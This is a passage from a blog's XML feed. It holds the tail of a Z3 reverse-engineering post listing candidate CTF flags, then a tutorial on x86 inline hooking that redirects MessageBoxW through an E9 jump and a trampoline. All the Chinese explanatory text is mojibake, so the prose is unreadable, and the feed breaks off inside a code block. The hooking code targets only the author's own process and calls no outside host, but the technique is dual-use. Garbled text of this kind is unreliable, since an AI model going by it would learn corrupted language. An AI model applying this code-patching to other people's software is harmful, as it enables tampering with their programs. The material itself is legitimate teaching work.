class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå‡æ˜¯è§£</p><p>è¡¥å……è¯´æ˜ï¼š</p><p>å¦‚æœæƒ³çº¦æŸæŸä¸ªå€¼åªèƒ½å‡ºç°ä¸€æ¬¡ï¼Œæ¯”å¦‚{,}ï¼Œå¯ä»¥ç”¨Sumï¼š</p><p>Sumç”¨äºè®¡ç®—ä¸€ç³»åˆ—è¡¨è¾¾å¼çš„å’Œç±»ä¼¼äºåŠ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s.add(Sum([If(i == BitVecVal(<span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>), <span class="number">8</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag]) &lt;= <span class="number">1</span>)</span><br><span class="line">s.add(Sum([If(i == BitVecVal(<span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>), <span class="number">8</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag]) &lt;= <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>è®¡ç®—flagä¸­ç­‰äºæ‹¬å·çš„å€¼çš„è¡¨è¾¾å¼ä¸ªæ•°ï¼Œç„¶åè®©å…¶å°äºç­‰äº1</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> å·¥å…· </category>
          
          <category> Z3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> ç¬¦å·æ‰§è¡Œ </tag>
            
            <tag> z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…è”é’©å­åŸç†</title>
      <link href="/posts/23a55d41.html"/>
      <url>/posts/23a55d41.html</url>
      
        <content type="html"><![CDATA[<h1>Inline hook</h1><p>Inline hook(å†…è”é’©å­)æ˜¯ä¸€ç§å†ç¨‹åºè¿è¡Œæ—¶<code>ä¿®æ”¹å‡½æ•°æ‰§è¡Œæµç¨‹</code>çš„æŠ€æœ¯ã€‚é€šè¿‡ä¿®æ”¹å‡½æ•°åŸå§‹ä»£ç  è®²ç›®æ ‡å‡½æ•°çš„æ‰§è¡Œè·¯å¾„é‡å®šå‘åˆ°è‡ªå®šä¹‰çš„ä»£ç æ®µï¼Œä»è€Œå®ç°å¯¹ç›®æ ‡å‡½æ•°çš„æ‹¦æˆªå’Œä¿®æ”¹ã€‚</p><p><img src="https://s2.loli.net/2024/01/11/AidLhJUkqP7NXRY.png" alt="image-20240111101326816"></p><p><img src="https://s2.loli.net/2024/01/11/LOXJnCdHrv5UzbA.png" alt="image-20240111103102751"></p><p>å¯¹ä¸€ä¸ªå‡½æ•°hookçš„æ–¹æ³•ï¼š</p><ol><li>ä»å“ªæ¥åˆ°å“ªå»</li><li>å¦‚ä½•å®ç°è·³è½¬<br>E9 + å››å­—èŠ‚ç›¸å¯¹åœ°å€ï¼ˆE9æ˜¯jmpçš„å€¼ï¼‰ï¼ˆç›¸å½“äºä¸€å…±5å­—èŠ‚ï¼‰<br>ä¿®æ”¹æ—¶ï¼Œå¦‚æœæŒ‡ä»¤é•¿åº¦å¤§äº5ï¼Œåˆ™å¤šä½™çš„å€¼ä¼šå’Œä¸‹ä¸€æ¡ä»£ç ç»“åˆä¸ºæ–°ä»£ç ï¼Œæ‰€ä»¥é˜²æ­¢å´©æºƒå¯ä»¥å†™æˆnopï¼ˆ90ï¼‰<br>è¿™ä¸ªç›¸å¯¹åœ°å€ä¸ç®—è¿™æ¡æŒ‡ä»¤æœ¬èº«</li><li>å¦‚ä½•ä¿®æ”¹ä»£ç <br>å½“å·²ç»æœ‰ä¸€ä¸ªæˆ‘ä»¬æƒ³è¦hookçš„å‡½æ•°æ—¶ï¼Œéœ€è¦å…ˆè·å¾—å®ƒçš„ä¼ å…¥å‚æ•°ï¼Œå¹¶ä»¤hookå‡½æ•°çš„å‚æ•°ä¸æƒ³è¦hookçš„å‡½æ•°çš„å‚æ•°ç±»å‹ï¼Œä¸ªæ•°ç›¸åŒï¼Œä»¥ä¿è¯å †æ ˆå¹³è¡¡<br>ä¸ºäº†åœ¨è¿è¡Œæ—¶ä¿®æ”¹ä»£ç éœ€è¦virtualprotectå‡½æ•°ï¼ˆwindowsä¸‹ï¼‰æ¥ä¿®æ”¹æŸå¤„çš„è®¿é—®æƒé™</li></ol><p>æ³¨ï¼šå®éªŒç¯å¢ƒä¸ºx86ï¼Œå› ä¸ºåœ¨x64ä¸‹ç›¸å¯¹åœ°å€çš„å€¼å¤§äº4å­—èŠ‚å¯¼è‡´ä¸èƒ½æ­£å¸¸è·³è½¬</p><p>é‚£ä¹ˆå°è¯•ä¿®æ”¹å¹¶hookä¸€ä¸ªå‡½æ•°ï¼š</p><h2 id="0x1">0x1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">hooker(MessageBoxW, mybox, <span class="number">5</span>);</span><br><span class="line">MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;Hello&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mainå‡½æ•°å…ˆè°ƒç”¨hookerå‡½æ•°ï¼Œä¿®æ”¹messageboxçš„å†…å®¹ï¼Œç„¶åæ‰§è¡Œè¢«ä¿®æ”¹çš„messageboxå‡½æ•°</p><p>é‚£ä¹ˆhookerå‡½æ•°å°±è¦ä¼ å…¥messageboxå‡½æ•°çš„åœ°å€ï¼Œå’Œæˆ‘ä»¬æƒ³è¦ä¿®æ”¹æˆçš„å‡½æ•°çš„åœ°å€ï¼Œè¿™é‡Œçš„é•¿åº¦å¯ä»¥æ˜¯å›ºå®šçš„ï¼Œå¯ä»¥ä¸å†™5</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hooker</span><span class="params">(<span class="type">void</span>* src, <span class="type">void</span>* dst, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">DWORD old;</span><br><span class="line">VirtualProtect(src, len, <span class="number">0x40</span>, &amp;old);</span><br><span class="line"><span class="built_in">memcpy</span>(back, src, len);</span><br><span class="line">*(BYTE*)src = <span class="number">0xE9</span>;</span><br><span class="line"><span class="type">uintptr_t</span> ra = (<span class="type">uintptr_t</span>)dst - (<span class="type">uintptr_t</span>)src - <span class="number">5</span>;</span><br><span class="line">*(DWORD*)((BYTE*)src + <span class="number">1</span>) = ra;</span><br><span class="line">VirtualProtect(src, len, old, &amp;old);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å‡½æ•°å¤–é¢åˆ›å»ºä¸€ä¸ªå¤‡ä»½BYTE back[5];ç”¨æ¥ä¿å­˜åŸå§‹æ•°æ®ï¼Œç„¶åç”¨VirtualProtectä¿®æ”¹å‡½æ•°å‰5ä¸ªå­—èŠ‚å˜æˆå¯å†™å±æ€§(0x40),ç„¶åå¤‡ä»½åŸå§‹å±æ€§åˆ°oldå¹¶ä¿®æ”¹ï¼Œæ ¸å¿ƒå…¬å¼æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(BYTE*)src = <span class="number">0xE9</span>;</span><br><span class="line"><span class="type">uintptr_t</span> ra = (<span class="type">uintptr_t</span>)dst - (<span class="type">uintptr_t</span>)src - <span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>ç„¶åæ”¹å›å»</p><p>æœ€åå°±æ˜¯å®ç°è‡ªå·±çš„å‡½æ•°ï¼Œä¸€å®šè¦æ³¨æ„å‡½æ•°çš„ä¼ å…¥å‚æ•°å¿…é¡»è¦å’ŒåŸå‡½æ•°ç›¸åŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WINAPI <span class="title function_">mybox</span><span class="params">(_In_opt_ HWND hWnd, </span></span><br><span class="line"><span class="params"> _In_opt_ LPCWSTR lpText, </span></span><br><span class="line"><span class="params"> _In_opt_ LPCWSTR lpCaption, </span></span><br><span class="line"><span class="params"> _In_ UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">lpText = <span class="string">L&quot;hooked&quot;</span>;<span class="comment">//æƒ³è¦ä¿®æ”¹çš„æ•ˆæœ</span></span><br><span class="line">unhook(MessageBoxW, back, <span class="number">5</span>);</span><br><span class="line">MessageBoxW(hWnd, lpText, lpCaption, uType);</span><br><span class="line">hooker(MessageBoxW, mybox, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé€šè¿‡å»å®˜ç½‘ç›´æ¥æŠ„ä¼ å…¥å‚æ•°å°±å¯ä»¥ç›´æ¥å¾—åˆ°å‚æ•°å<br>åŒæ—¶æ³¨æ„è¦å…ˆè§£é™¤é’©å­å†è°ƒç”¨åŸå‡½æ•°ä¸ç„¶ä¼šé™·å…¥å¾ªç¯é€’å½’</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">(<span class="type">void</span>* src, <span class="type">void</span>* back, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">DWORD old;</span><br><span class="line">VirtualProtect(src, len, <span class="number">0x40</span>, &amp;old);</span><br><span class="line"><span class="built_in">memcpy</span>(src, back, <span class="number">5</span>);</span><br><span class="line">VirtualProtect(src, len, old, &amp;old);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è°ƒç”¨å®Œç›®æ ‡å‡½æ•°åï¼Œè¿˜è¦å†æ¬¡é’©ä½å‡½æ•°ï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡è°ƒç”¨</p><hr><h2 id="0x2">0x2</h2><p>ç”±äºåˆšåˆšçš„hookå‡½æ•°ï¼Œæ¯æ¬¡å¿…é¡»è¦å…ˆhookï¼Œç„¶åå†unhookï¼Œååˆ†éº»çƒ¦ã€‚åŒæ—¶ï¼Œæ¯æ¬¡è°ƒç”¨messageboxçš„æ•ˆæœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¦‚æœæƒ³è¦å®ç°æ˜¾ç¤ºå…¶å®ƒä¸œè¥¿ï¼Œéœ€è¦å¦ä¸€ç§æ–¹æ³•ã€‚</p><p>å¯¹äºç¬¬ä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœä¸å¯¹hookè¿‡çš„å‡½æ•°unhookï¼Œé‚£ä¹ˆå°±ä¼šé™·å…¥æ­»å¾ªç¯ï¼Œæ— é™è°ƒç”¨è‡ªå·±ï¼Œå¦‚æœç°åœ¨æœ‰ä¸€ä¸ªå’Œmessageboxçš„å‡½æ•°æ•ˆæœç›¸åŒçš„å‡½æ•°ï¼Œåœ¨hookåï¼Œä¸è°ƒç”¨messageboxï¼Œè€Œæ˜¯è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå°±ä¸ä¼šå†…å­˜æº¢å‡º</p><p>å¯¹äºç¬¬äºŒä¸ªé—®é¢˜ï¼šå¦‚æœæœ‰ä¸€ä¸ªå’Œmessageboxå‡½æ•°ç›¸åŒçš„å‡½æ•°ï¼Œé‚£ä¹ˆç›´æ¥è°ƒç”¨é‚£ä¸ªå‡½æ•°å¹¶ä¿®æ”¹å‚æ•°å°±å¯ä»¥æ˜¾ç¤ºå…¶å®ƒä¸œè¥¿ã€‚</p><p>å› æ­¤ï¼Œåªè¦èƒ½æ„é€ å‡ºä¸€ä¸ªå’Œæˆ‘ä»¬æƒ³hookçš„å‡½æ•°åŠŸèƒ½ç›¸åŒçš„å‡½æ•°å°±å¯ä»¥è§£å†³ä¸Šé¢ä¸¤ä¸ªé—®é¢˜ã€‚</p><img src="https://s2.loli.net/2024/01/22/qxNQeGt8BPVSALM.png" alt="hookå‰" style="zoom:50%;" /><img src="https://s2.loli.net/2024/01/22/3d5KXVOaSiGCMLx.png" alt="hookå" /><p>é‚£ä¹ˆå…ˆæ„é€ trampolineå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">trampoline</span><span class="params">(<span class="type">void</span>* src, <span class="type">void</span>* dst, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">BYTE* boxin = (BYTE*)VirtualAlloc(<span class="number">0</span>, len + <span class="number">5</span>, <span class="number">0x00001000</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(boxin, src, len);</span><br><span class="line">*(boxin + len) = <span class="number">0xe9</span>;</span><br><span class="line">*(DWORD*)(boxin + len + <span class="number">1</span>) = (BYTE*)src - boxin - <span class="number">5</span>;</span><br><span class="line"><span class="comment">//ä»¥ä¸‹ä¸ºåŸhookerçš„å†…å®¹</span></span><br><span class="line">DWORD old;</span><br><span class="line">VirtualProtect(src, len, <span class="number">0x40</span>, &amp;old);</span><br><span class="line">*(BYTE*)src = <span class="number">0xE9</span>;</span><br><span class="line"><span class="type">uintptr_t</span> ra = (<span class="type">uintptr_t</span>)dst - (<span class="type">uintptr_t</span>)src - <span class="number">5</span>;</span><br><span class="line">*(DWORD*)((BYTE*)src + <span class="number">1</span>) = ra;</span><br><span class="line">VirtualProtect(src, len, old, &amp;old);</span><br><span class="line"><span class="keyword">return</span> boxin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‰4å¥éƒ½æ˜¯åœ¨åˆ›å»ºåŠŸèƒ½ç›¸åŒå‡½æ•°ï¼Œç›´æ¥ç”³è¯·å†…å­˜æŠŠmessageboxå‰5ä¸ªå­—èŠ‚å¤åˆ¶è¿‡æ¥ï¼Œç„¶åjmpåˆ°messageboxé‡Œï¼ˆå·æ‡’ï¼‰</p><p>ç¬¬5å¥åˆ°10å¥çš„hookerå’Œä¹‹å‰çš„hookerä¸€æ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hooker</span><span class="params">(<span class="type">void</span>* src, <span class="type">void</span>* dst, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">DWORD old;</span><br><span class="line">VirtualProtect(src, len, <span class="number">0x40</span>, &amp;old);</span><br><span class="line">*(BYTE*)src = <span class="number">0xE9</span>;</span><br><span class="line"><span class="type">uintptr_t</span> ra = (<span class="type">uintptr_t</span>)dst - (<span class="type">uintptr_t</span>)src - <span class="number">5</span>;</span><br><span class="line">*(DWORD*)((BYTE*)src + <span class="number">1</span>) = ra;</span><br><span class="line">VirtualProtect(src, len, old, &amp;old);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åä¸€å¥returnæ˜¯ä¸ºäº†ä¹‹åä½¿ç”¨ä¸è¢«hookçš„å‡½æ•°</p><p>ç„¶åå…ˆæŠŠç›¸åŒåŠŸèƒ½å‡½æ•°çš„è°ƒç”¨å†™å‡ºæ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">using PFUN = <span class="type">int</span> (WINAPI*)(</span><br><span class="line">_In_opt_ HWND hWnd,</span><br><span class="line">_In_opt_ LPCWSTR lpText,</span><br><span class="line">_In_opt_ LPCWSTR lpCaption,</span><br><span class="line">_In_ UINT uType);</span><br><span class="line">PFUN pfun = nullptr;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">pfun = (PFUN)trampoline(MessageBoxW, mybox, <span class="number">5</span>);</span><br><span class="line">MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;Hello&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;Hello&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;Hello&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">pfun(<span class="number">0</span>, <span class="string">L&quot;123123&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ·»ä¸Šhookå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 